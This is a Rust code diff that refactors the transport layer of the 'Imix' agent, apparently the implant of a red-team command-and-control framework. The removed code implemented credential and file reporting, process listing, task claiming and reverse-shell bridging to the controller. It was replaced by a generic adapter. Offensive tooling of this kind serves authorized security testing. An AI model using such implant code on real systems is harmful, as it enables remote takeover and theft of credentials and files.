@@ -7,7 +7,7 @@ use std::collections::{BTreeMap, BTreeSet};
 use std::sync::mpsc::{Receiver, Sender};
 use std::sync::{Arc, Mutex};
 use tokio::sync::RwLock;
-use transport::{SyncTransport, Transport};
+use transport::{SyncTransport, SyncTransportAdapter, Transport};
 
 use crate::shell::{run_repl_reverse_shell, run_reverse_shell_pty};
 use crate::task::TaskRegistry;
@@ -22,113 +22,6 @@ pub struct ImixAgent<T: Transport> {
     pub task_registry: Arc<TaskRegistry>,
     pub subtasks: Arc<Mutex<BTreeMap<i64, tokio::task::JoinHandle<()>>>>,
     pub output_buffer: Arc<Mutex<Vec<c2::ReportTaskOutputRequest>>>,
-}
-
-struct ImixSyncTransport<T: Transport> {
-    agent: Arc<ImixAgent<T>>,
-}
-
-impl<T: Transport + Sync + Send + 'static> SyncTransport for ImixSyncTransport<T> {
-    fn fetch_asset(&self, req: c2::FetchAssetRequest) -> Result<Vec<u8>> {
-        self.agent
-            .with_transport(|mut t| async move {
-                let (tx, rx) = std::sync::mpsc::channel();
-                t.fetch_asset(req, tx).await?;
-                let mut data = Vec::new();
-                while let Ok(resp) = rx.recv() {
-                    data.extend(resp.chunk);
-                }
-                Ok(data)
-            })
-            .map_err(|e| anyhow::anyhow!(e))
-    }
-
-    fn report_credential(
-        &self,
-        req: c2::ReportCredentialRequest,
-    ) -> Result<c2::ReportCredentialResponse> {
-        self.agent
-            .with_transport(|mut t| async move { t.report_credential(req).await })
-            .map_err(|e| anyhow::anyhow!(e))
-    }
-
-    fn report_file(&self, req: c2::ReportFileRequest) -> Result<c2::ReportFileResponse> {
-        self.agent
-            .with_transport(|mut t| async move {
-                let (tx, rx) = std::sync::mpsc::channel();
-                tx.send(req)?;
-                drop(tx);
-                t.report_file(rx).await
-            })
-            .map_err(|e| anyhow::anyhow!(e))
-    }
-
-    fn report_process_list(
-        &self,
-        req: c2::ReportProcessListRequest,
-    ) -> Result<c2::ReportProcessListResponse> {
-        self.agent
-            .with_transport(|mut t| async move { t.report_process_list(req).await })
-            .map_err(|e| anyhow::anyhow!(e))
-    }
-
-    fn report_task_output(
-        &self,
-        req: c2::ReportTaskOutputRequest,
-    ) -> Result<c2::ReportTaskOutputResponse> {
-        self.agent
-            .buffer_task_output(req)
-            .map_err(|e| anyhow::anyhow!(e))?;
-        Ok(c2::ReportTaskOutputResponse {})
-    }
-
-    fn reverse_shell(
-        &self,
-        rx: Receiver<c2::ReverseShellRequest>,
-        tx: Sender<c2::ReverseShellResponse>,
-    ) -> Result<()> {
-        let agent = self.agent.clone();
-        self.agent.runtime_handle.spawn(async move {
-            let transport_result = agent.get_usable_transport().await;
-            match transport_result {
-                Ok(mut t) => {
-                    let (tokio_tx_req, tokio_rx_req) = tokio::sync::mpsc::channel(32);
-                    let (tokio_tx_resp, mut tokio_rx_resp) = tokio::sync::mpsc::channel(32);
-                    let rx_bridge = tokio::task::spawn_blocking(move || {
-                        while let Ok(msg) = rx.recv() {
-                            if tokio_tx_req.blocking_send(msg).is_err() {
-                                break;
-                            }
-                        }
-                    });
-                    let tx_bridge = tokio::spawn(async move {
-                        while let Some(msg) = tokio_rx_resp.recv().await {
-                            if tx.send(msg).is_err() {
-                                break;
-                            }
-                        }
-                    });
-                    if let Err(_e) = t.reverse_shell(tokio_rx_req, tokio_tx_resp).await {
-                        #[cfg(debug_assertions)]
-                        log::error!("Transport reverse_shell error: {_e}");
-                    }
-                    rx_bridge.abort();
-                    tx_bridge.abort();
-                }
-                Err(e) => {
-                    #[cfg(debug_assertions)]
-                    log::error!("Failed to get transport for reverse shell: {e}");
-                }
-            }
-        });
-        Ok(())
-    }
-
-    fn claim_tasks(&self, req: c2::ClaimTasksRequest) -> Result<c2::ClaimTasksResponse> {
-        self.agent
-            .with_transport(|mut t| async move { t.claim_tasks(req).await })
-            .map_err(|e| anyhow::anyhow!(e))
-    }
 }
 
 impl<T: Transport + Sync + Send + 'static> ImixAgent<T> {
@@ -254,9 +147,10 @@ impl<T: Transport + Sync + Send + 'static> ImixAgent<T> {
     }
 
     pub fn get_sync_transport(&self) -> Arc<dyn SyncTransport> {
-        Arc::new(ImixSyncTransport {
-            agent: Arc::new(self.clone()),
-        })
+        Arc::new(SyncTransportAdapter::new(
+            self.transport.clone(),
+            self.runtime_handle.clone(),
+        ))
     }
 
     fn with_transport<F, Fut, R>(&self, action: F) -> Result<R, String>
